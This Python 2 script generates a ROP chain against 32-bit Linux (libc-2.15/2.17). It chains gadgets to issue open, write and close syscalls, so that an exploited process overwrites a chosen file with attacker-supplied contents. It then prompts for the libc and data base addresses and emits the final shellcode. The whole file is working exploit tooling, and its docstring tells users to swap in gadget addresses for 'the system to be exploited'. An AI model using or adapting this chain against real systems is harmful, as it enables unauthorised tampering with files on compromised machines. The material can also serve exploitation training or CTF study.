import re
import sys

import gadgets as g

from rop_shellcode import GenerateROPShellcode
 
"""
This program is to create an ROP program to edit a specific file
"""
 
"""
These are the commands usually used to call execve on 32-bit systems
They've been tested on libc-2.15 and libc-2.17
Please change only the relative addresses of the gadgets to the ones on the system to be exploited.
"""
 
rop_code = ''
 
offset = 4
 
def open_file(file_name):
 
    global rop_code
    global offset
 
    if len(file_name) % 4 > 0:
        null_offset = len(file_name) % 4
        for i in range (0, 4 - len(file_name) % 4):
            file_name = file_name + 'a'
    else:
        null_offset = 4
   
    tokens = re.findall('....', file_name)
 
    for token in tokens:
        commands = [g.pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + g.mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ': ' + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = rop_code + ''.join(commands)
        offset = offset + 4
 
    null_offset = null_offset + offset - 4
 
    rop_code = rop_code + g.pop_ebx_ret + 'Address    : 0x4: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + g.xor_eax_eax
    rop_code = rop_code + g.pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\nAddress    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n'
    rop_code = rop_code + g.mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + g.xor_edx_edx_mov_eax_edx
    rop_code = rop_code + g.pop_ecx_pop_edx + 'Padding    : 0x02020202: (To neutralize pop ecx)\\nAddress    : ' + str(hex(null_offset + 4)) + ': Offset for 0x2 (.data base)\\n'
    rop_code = rop_code + g.mov_eax_0x2
    rop_code = rop_code + g.mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + g.mov_ecx_eax_mov_edx_ecx_pop_ebx + 'Address    : 0x4: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + g.xor_edx_edx_mov_eax_edx
    rop_code = rop_code + g.add_eax_0x5
    rop_code = rop_code + g.call_gs_10
 
 
def write_file(file_name):
 
    global rop_code
    global offset
 
    rop_code = rop_code + g.mov_edx_eax_mov_eax_edx
    rop_code = rop_code + g.mov_ebx_edx
 
    contents = open(file_name, 'r').readlines()
    contents = ''.join(contents)
 
    if len(contents) % 4 > 0:
        null_offset = len(contents) % 4
        for i in range (0, 4 - len(contents) % 4):
            contents = contents + 'a'
    else:
        null_offset = 4
 
    tokens = re.findall('....', contents)
 
    offset = offset + 4
    content_offset = offset
 
    for token in tokens:
        commands = [g.pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + g.mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = rop_code + ''.join(commands)
        offset = offset + 4
 
    null_offset = null_offset + offset - 4
 
    rop_code = rop_code + g.xor_eax_eax
    rop_code = rop_code + g.pop_ecx_pop_edx + 'Address    : ' + str(hex(content_offset)) + ': Offset for Hack (.data base)\\nAddress    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n'
    rop_code = rop_code + g.mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + g.xor_edx_edx_mov_eax_edx
 
    contents_len = len(contents)
 
    mapping = { 48 : g.add_eax_0x30, 32 : g.add_eax_0x20, 16 : g.add_eax_0x10, 8 : g.add_eax_0x8, 4 : g.add_eax_0x4 }
    denominations = [48, 32, 16, 8, 4]
 
    for d in denominations:
        while contents_len / d > 0:
            rop_code = rop_code + mapping[d]
            if mapping[d] == g.add_eax_0x10 or mapping[d] == g.add_eax_0x20 or mapping[d] == g.add_eax_0x30:
                rop_code = rop_code + 'Padding    : 0x01010101: (To neutralize pop ecx)\\nPadding    : 0x01010101: (To neutralize pop ecx)\\n'
            contents_len = contents_len - d
   
    rop_code = rop_code + g.mov_edx_eax_mov_eax_edx
    rop_code = rop_code + g.mov_eax_0x4
    rop_code = rop_code + g.call_gs_10
 
 
def close_file():
 
    global rop_code
 
    rop_code = rop_code + g.mov_eax_0x6
    rop_code = rop_code + g.call_gs_10
 
 
def main():

    global rop_code

    if len(sys.argv) < 3:
        print 'Please enter the file to be edited and the file whose contents need to be read.'
        sys.exit(1)

    g.init(len(sys.argv)-1)
 
    open_file(sys.argv[1])
    write_file(sys.argv[2])
    close_file()

    if len(sys.argv) > 3 and sys.argv[3] == 'print':
        print rop_code[:-2]
        sys.exit(0)

    generator = GenerateROPShellcode(padding=0, _id=0, json_file=None)
    generator.code = rop_code[:-2].replace('\\n', '\n')
    generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
    generator.data_base = hex(int(str(raw_input('Enter the data base (format - 0xdeadbeef): ')).replace('L', ''), 16))
    generator.padding = int(raw_input('Padding: '))
    generator.write_code = str(raw_input('Would you like to write the code into a file (y/n)? ')) == 'y'
    generator.construct_shellcode()
 
 
if __name__ == '__main__':
    main()